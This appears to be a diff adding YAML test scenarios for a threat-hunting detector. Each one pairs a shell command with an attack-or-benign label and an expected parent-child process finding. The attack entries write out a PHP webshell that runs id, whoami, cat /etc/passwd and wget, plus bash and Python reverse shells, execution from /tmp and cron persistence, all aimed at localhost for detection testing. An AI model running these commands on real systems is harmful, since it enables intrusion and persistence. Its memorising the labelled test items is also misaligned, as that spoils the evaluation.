@@ -1,0 +1,166 @@
+scenarios:
+- name: RCE — webshell ruleaza id
+  path: hunt
+  ground_truth: attack
+  generate: printf "%s" "<?php system(\$_GET[\"c\"]); ?>" | sudo tee /var/www/html/h.php
+    >/dev/null && curl -s "http://localhost/h.php?c=id" >/dev/null && sudo rm /var/www/html/h.php
+  finding:
+    host: web-prod
+    kind: new_parent_child
+    detail:
+      parent: dash
+      child: id
+    rarity_score: 1.0
+- name: RCE — webshell ruleaza whoami
+  path: hunt
+  ground_truth: attack
+  generate: printf "%s" "<?php system(\$_GET[\"c\"]); ?>" | sudo tee /var/www/html/h.php
+    >/dev/null && curl -s "http://localhost/h.php?c=whoami" >/dev/null && sudo rm
+    /var/www/html/h.php
+  finding:
+    host: web-prod
+    kind: new_parent_child
+    detail:
+      parent: dash
+      child: whoami
+    rarity_score: 1.0
+- name: RCE — webshell citeste /etc/passwd
+  path: hunt
+  ground_truth: attack
+  generate: printf "%s" "<?php system(\$_GET[\"c\"]); ?>" | sudo tee /var/www/html/h.php
+    >/dev/null && curl -s "http://localhost/h.php?c=cat+/etc/passwd" >/dev/null &&
+    sudo rm /var/www/html/h.php
+  finding:
+    host: web-prod
+    kind: new_parent_child
+    detail:
+      parent: dash
+      child: cat
+    rarity_score: 1.0
+- name: Reverse shell — bash /dev/tcp
+  path: hunt
+  ground_truth: attack
+  generate: timeout 2 bash -c "bash -i >& /dev/tcp/127.0.0.1/9999 0>&1" 2>/dev/null;
+    echo done
+  finding:
+    host: web-prod
+    kind: new_parent_child
+    detail:
+      parent: bash
+      child: bash
+    rarity_score: 0.9
+- name: Executie din /tmp — binar aruncat
+  path: hunt
+  ground_truth: attack
+  generate: cp /bin/true /tmp/.x 2>/dev/null && /tmp/.x; rm -f /tmp/.x
+  finding:
+    host: web-prod
+    kind: new_parent_child
+    detail:
+      parent: bash
+      child: .x
+    rarity_score: 1.0
+- name: Download payload — webshell lanseaza wget
+  path: hunt
+  ground_truth: attack
+  generate: printf "%s" "<?php system(\$_GET[\"c\"]); ?>" | sudo tee /var/www/html/h.php
+    >/dev/null && curl -s "http://localhost/h.php?c=wget+-q+http://127.0.0.1/" >/dev/null
+    && sudo rm /var/www/html/h.php
+  finding:
+    host: web-prod
+    kind: new_parent_child
+    detail:
+      parent: dash
+      child: wget
+    rarity_score: 1.0
+- name: Admin curl catre localhost
+  path: hunt
+  ground_truth: benign
+  generate: curl -s http://localhost/ >/dev/null
+  finding:
+    host: web-prod
+    kind: new_parent_child
+    detail:
+      parent: bash
+      child: curl
+    rarity_score: 0.8
+- name: Admin verifica versiunea php
+  path: hunt
+  ground_truth: benign
+  generate: php --version >/dev/null
+  finding:
+    host: web-prod
+    kind: new_parent_child
+    detail:
+      parent: bash
+      child: php8.4
+    rarity_score: 0.7
+- name: Deploy legitim — script din /opt de admin
+  path: hunt
+  ground_truth: benign
+  generate: sudo mkdir -p /opt/app && echo "print 1" | sudo tee /opt/app/build.pl
+    >/dev/null && sudo perl /opt/app/build.pl >/dev/null
+  finding:
+    host: web-prod
+    kind: new_parent_child
+    detail:
+      parent: sudo
+      child: perl
+    rarity_score: 0.6
+- name: Admin listeaza fisiere cu find
+  path: hunt
+  ground_truth: benign
+  generate: find /var/www -name "*.php" 2>/dev/null | head >/dev/null
+  finding:
+    host: web-prod
+    kind: new_parent_child
+    detail:
+      parent: bash
+      child: find
+    rarity_score: 0.7
+- name: Cron ruleaza sed (baseline normal)
+  path: hunt
+  ground_truth: benign
+  generate: echo "test" | sed "s/test/ok/" >/dev/null
+  finding:
+    host: web-prod
+    kind: new_parent_child
+    detail:
+      parent: bash
+      child: sed
+    rarity_score: 0.5
+- name: Admin verifica procesele cu ps
+  path: hunt
+  ground_truth: benign
+  generate: ps aux >/dev/null
+  finding:
+    host: web-prod
+    kind: new_parent_child
+    detail:
+      parent: bash
+      child: ps
+    rarity_score: 0.6
+- name: Persistenta — cron job adaugat
+  path: hunt
+  ground_truth: attack
+  generate: (crontab -l 2>/dev/null; echo "* * * * * /tmp/.beacon") | crontab - ;
+    crontab -r
+  finding:
+    host: web-prod
+    kind: new_parent_child
+    detail:
+      parent: bash
+      child: crontab
+    rarity_score: 0.9
+- name: Reverse shell in Python
+  path: hunt
+  ground_truth: attack
+  generate: timeout 2 python3 -c "import socket,os; s=socket.socket(); s.connect((\"127.0.0.1\",9998))"
+    2>/dev/null; echo done
+  finding:
+    host: web-prod
+    kind: new_parent_child
+    detail:
+      parent: timeout
+      child: python3.13
+    rarity_score: 1.0
